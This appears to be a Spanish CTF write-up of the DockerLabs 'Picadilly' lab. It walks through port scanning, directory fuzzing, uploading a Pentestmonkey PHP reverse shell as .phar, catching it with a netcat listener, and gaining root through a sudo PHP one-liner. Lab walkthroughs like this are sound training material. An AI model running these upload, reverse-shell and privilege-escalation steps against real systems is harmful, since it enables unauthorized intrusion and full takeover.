# Informe Técnico - Máquina Picadilly (DockerLabs)

**Dificultad:** Fácil

**Objetivos:** Acceso inicial a la máquina, explotación de vulnerabilidades web, escalada de privilegios a root.

---

## 1. Despliegue de la Máquina

Descargamos la máquina vulnerable `picadilly.zip` desde la página oficial de DockerLabs. Para descomprimir el archivo utilizamos el siguiente comando:

```bash
7z e picadilly.zip
```

Luego desplegamos la máquina ejecutando:

```bash
sudo bash auto_deploy.sh picadilly.tar
```

![Logo](/Picadilly/Imagenes/Logo.png)
![Inicio del despliegue](/Picadilly/Imagenes/Inicio.jpeg)

Verificamos que la máquina esté activa con un simple `ping`:

```bash
ping -c1 172.17.0.2
```

![Comprobación de conectividad](/Picadilly/Imagenes/Ping.jpeg)

---

## 2. Reconocimiento con Nmap

Realizamos un escaneo completo de puertos con Nmap para identificar servicios activos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![Puertos detectados](/Picadilly/Imagenes/Puertos.jpeg)

Después, utilizamos un script personalizado para extraer los puertos abiertos y la IP objetivo:

```bash
extractPorts allPorts.txt
```

Con los puertos relevantes, hacemos un escaneo más detallado para identificar servicios y versiones:

```bash
nmap -sC -sV -p 80,443 172.17.0.2 -oN target.txt
```

![Servicios detectados](/Picadilly/Imagenes/Servicios.jpeg)

---

## 3. Análisis de las Aplicaciones Web

Accedemos a la interfaz web en el puerto **80 (HTTP)** mediante:

```
http://172.17.0.2/
```

En esta página encontramos un archivo visible llamado `backup.txt`.

![Vista del puerto 80](/Picadilly/Imagenes/http.jpeg)
![Contenido de backup.txt](/Picadilly/Imagenes/backup.jpeg)

Este archivo contenía un acertijo cifrado con el método César. Tras descifrarlo, obtuvimos la palabra clave:

```
gcuaetzcba
```

En el archivo también encontramos credenciales:
**Usuario:** mateo
**Contraseña:** hdvbfuadcb

Accedemos al puerto **443 (HTTPS)** en:

```
https://172.17.0.2/
```

Allí se presenta una página con un sistema de publicación de posts y una funcionalidad de subida de archivos (upload).

![Página HTTPS con funcionalidad de Upload](/Picadilly/Imagenes/Pagina.jpeg)

---

## 4. Fuzzing de Directorios

Usamos herramientas de fuerza bruta para buscar rutas ocultas.

Primero con **Gobuster** en el puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

El único archivo interesante encontrado fue `backup.txt`.

Probamos también hacer fuzzing dentro de `/backup.txt`, pero sin resultados:

```bash
gobuster dir -u http://172.17.0.2/backup.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

![Resultado de Gobuster](/Picadilly/Imagenes/gobuster.jpeg)

Para el puerto 443 usamos **Wfuzz** debido a problemas con Gobuster:

```bash
wfuzz -c -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 https://172.17.0.2/FUZZ
```

Encontramos que la ruta `/uploads/` estaba habilitada.

![Wfuzz detectando el directorio de subida](/Picadilly/Imagenes/wfuzz.jpeg)
![Directorio /uploads encontrado](/Picadilly/Imagenes/uploads.jpeg)

---

## 5. Obtención de Acceso con Reverse Shell

Dado que existía una opción de subir archivos en la sección de posts, intentamos subir una *reverse shell* en PHP.

El archivo fue descargado desde el repositorio de [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

Para evitar restricciones de extensiones, renombramos el archivo como `.phar`. Sorprendentemente, el sistema permitía la subida sin restricción.

![Subida de archivo PHP](/Picadilly/Imagenes/post.jpeg)
![Archivo reverse shell subido exitosamente](/Picadilly/Imagenes/revellshe.jpeg)

Colocamos nuestro host en modo escucha con:

```bash
sudo nc -lvnp 443
```

Y accedimos a la shell mediante:

```
https://172.17.0.2/uploads/reverse.phar
```

¡La conexión fue exitosa!

![Shell remota activa](/Picadilly/Imagenes/shell.jpeg)

---

## 6. Escalada de Privilegios

Ya dentro del sistema, buscamos métodos para escalar privilegios.

Primero ejecutamos:

```bash
sudo -l
```

No se encontró nada útil, por lo que nos dirigimos al directorio `/home`, donde confirmamos que el usuario `mateo` existía.

Probamos autenticarnos como `mateo` con la contraseña que encontramos en el archivo `backup.txt`, ahora ya descifrada:

```
su mateo
Contraseña: easycrazy
```

Al entrar como `mateo`, volvimos a revisar sudo:

```bash
sudo -l
```

Salida:

```
(ALL) NOPASSWD: /usr/bin/php
```

Esto nos dio acceso total. Ejecutamos el siguiente comando para obtener una shell como root:

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

![Acceso root conseguido](/Picadilly/Imagenes/root.jpeg)

---

## Conclusión

Esta máquina presenta una ruta de explotación sencilla pero completa: detección de credenciales en un archivo público, un sistema de subida vulnerable sin filtros, y una mala configuración de `sudo` que permite ejecución de comandos como root mediante PHP. Es ideal para entender fallos típicos en seguridad web y escalada de privilegios basada en configuraciones inseguras.


